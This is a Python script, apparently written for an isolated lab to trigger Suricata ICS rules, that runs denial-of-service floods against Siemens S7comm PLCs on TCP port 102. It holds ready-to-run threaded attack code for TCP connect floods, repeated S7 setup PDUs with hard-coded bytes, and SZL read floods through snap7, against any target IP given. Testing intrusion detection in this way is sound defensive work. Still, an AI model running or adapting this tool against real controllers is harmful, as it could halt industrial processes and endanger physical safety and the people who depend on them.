#!/usr/bin/env python3
"""
Lab-only DoS scenarios against Siemens S7comm (TCP/102).

Default (--mode all): chạy lần lượt setup_flood → tcp_connect → szl_flood,
có khoảng nghỉ giữa các phase để Suricata kịp sinh alert (ics_dos.rules).

Suricata SIDs: 1000040 (tcp), 1000041 (setup), 1000042 (szl), 1000043 (job).

WARNING: Authorized isolated lab only.
"""
from __future__ import annotations

import argparse
import socket
import sys
import threading
import time
from typing import Callable

DEFAULT_PLC = "172.16.16.145"
PORT = 102
RACK, SLOT = 0, 2

DEFAULT_PHASE_DURATION = 10.0
DEFAULT_PAUSE = 8.0

SETUP_PDU = bytes.fromhex(
    "0300002402f0803201000005000014"
    "0000f00000010200c0010a02000c0101"
)

# (mode, workers) — thứ tự khi --mode all
ALL_PHASES: tuple[tuple[str, int], ...] = (
    ("setup_flood", 4),
    ("tcp_connect", 6),
    ("szl_flood", 2),
)


class Stats:
    def __init__(self) -> None:
        self.ok = 0
        self.errors = 0
        self.lock = threading.Lock()

    def inc_ok(self, n: int = 1) -> None:
        with self.lock:
            self.ok += n

    def inc_err(self, n: int = 1) -> None:
        with self.lock:
            self.errors += n

    def snapshot(self) -> tuple[int, int]:
        with self.lock:
            return self.ok, self.errors


def tcp_connect_once(host: str) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, PORT))
    finally:
        try:
            s.close()
        except OSError:
            pass


def setup_once(host: str) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, PORT))
        s.sendall(SETUP_PDU)
        try:
            s.recv(4096)
        except OSError:
            pass
    finally:
        try:
            s.close()
        except OSError:
            pass


def worker_loop(
    stop: threading.Event,
    stats: Stats,
    fn: Callable[[], None],
    delay: float,
) -> None:
    while not stop.is_set():
        try:
            fn()
            stats.inc_ok()
        except OSError:
            stats.inc_err()
        except Exception:
            stats.inc_err()
        if delay > 0:
            time.sleep(delay)


def run_tcp_connect(host: str, workers: int, duration: float, delay: float) -> Stats:
    stats = Stats()
    stop = threading.Event()
    threads = [
        threading.Thread(
            target=lambda: worker_loop(stop, stats, lambda: tcp_connect_once(host), delay),
            daemon=True,
        )
        for _ in range(workers)
    ]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=2)
    return stats


def run_setup_flood(host: str, workers: int, duration: float, delay: float) -> Stats:
    stats = Stats()
    stop = threading.Event()
    threads = [
        threading.Thread(
            target=lambda: worker_loop(stop, stats, lambda: setup_once(host), delay),
            daemon=True,
        )
        for _ in range(workers)
    ]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=2)
    return stats


def run_szl_flood(host: str, workers: int, duration: float) -> Stats:
    try:
        import snap7  # noqa: F401
    except ImportError as e:
        print("szl_flood requires python-snap7: pip install python-snap7", file=sys.stderr)
        raise SystemExit(1) from e

    import snap7

    stats = Stats()
    stop = threading.Event()

    def szl_worker() -> None:
        plc = snap7.client.Client()
        while not stop.is_set():
            try:
                if not plc.get_connected():
                    plc.connect(host, RACK, SLOT)
                plc.read_szl(0x0011, 0x0000)
                stats.inc_ok()
            except Exception:
                stats.inc_err()
                try:
                    plc.disconnect()
                except Exception:
                    pass
                time.sleep(0.05)
        try:
            plc.disconnect()
        except Exception:
            pass

    threads = [threading.Thread(target=szl_worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    return stats


def run_mode(
    mode: str,
    host: str,
    workers: int,
    duration: float,
    delay: float,
) -> Stats:
    if mode == "tcp_connect":
        return run_tcp_connect(host, workers, duration, delay)
    if mode == "setup_flood":
        return run_setup_flood(host, workers, duration, delay)
    if mode == "szl_flood":
        return run_szl_flood(host, workers, duration)
    if mode == "job_flood":
        return run_setup_flood(host, workers, duration, delay)
    raise ValueError(mode)


def print_phase_result(mode: str, stats: Stats, elapsed: float) -> None:
    ok, err = stats.snapshot()
    rate = ok / elapsed if elapsed > 0 else 0
    print(f"  [{mode}] {elapsed:.1f}s — ok={ok} err={err} (~{rate:.1f} ops/s)")


def run_all_phases(
    host: str,
    duration: float,
    pause: float,
    delay: float,
) -> int:
    print(f"Target: {host}:{PORT}  --mode all  phase={duration}s  pause={pause}s")
    print("Phases:", " → ".join(m for m, _ in ALL_PHASES))
    print("Expected Suricata: 1000041/1000043, 1000040, 1000042\n")

    for idx, (mode, workers) in enumerate(ALL_PHASES):
        print(f"--- Phase {idx + 1}/{len(ALL_PHASES)}: {mode} (workers={workers}) ---")
        t0 = time.monotonic()
        try:
            stats = run_mode(mode, host, workers, duration, delay)
        except KeyboardInterrupt:
            print("\nInterrupted.")
            return 130
        print_phase_result(mode, stats, time.monotonic() - t0)
        if idx < len(ALL_PHASES) - 1:
            print(f"--- Pause {pause:.0f}s (IDS / threshold window) ---")
            time.sleep(pause)
    print("\nAll DoS phases finished.")
    return 0


def probe_plc(host: str) -> bool:
    try:
        tcp_connect_once(host)
        return True
    except OSError:
        return False


def main() -> int:
    parser = argparse.ArgumentParser(
        description="S7comm DoS lab — one script, default runs all phases with pause",
    )
    parser.add_argument("plc", nargs="?", default=DEFAULT_PLC, help="PLC IP")
    parser.add_argument(
        "--mode",
        choices=("all", "tcp_connect", "setup_flood", "szl_flood", "job_flood"),
        default="all",
        help="Attack pattern (default: all phases sequentially)",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=DEFAULT_PHASE_DURATION,
        help="Seconds per phase (or single mode)",
    )
    parser.add_argument(
        "--pause",
        type=float,
        default=DEFAULT_PAUSE,
        help="Seconds between phases when --mode all",
    )
    parser.add_argument("--workers", type=int, default=0, help="Override workers (0=auto per phase)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between ops per worker")
    parser.add_argument("--check", action="store_true", help="Only test TCP/102")
    args = parser.parse_args()

    if args.check:
        ok = probe_plc(args.plc)
        print(f"PLC {args.plc}:102 -> {'OK' if ok else 'FAIL'}")
        return 0 if ok else 1

    if args.mode == "all":
        return run_all_phases(args.plc, args.duration, args.pause, args.delay)

    workers = args.workers or 4
    print(f"Target: {args.plc}:{PORT}  mode={args.mode}  duration={args.duration}s  workers={workers}")
    t0 = time.monotonic()
    try:
        stats = run_mode(args.mode, args.plc, workers, args.duration, args.delay)
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130
    print_phase_result(args.mode, stats, time.monotonic() - t0)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
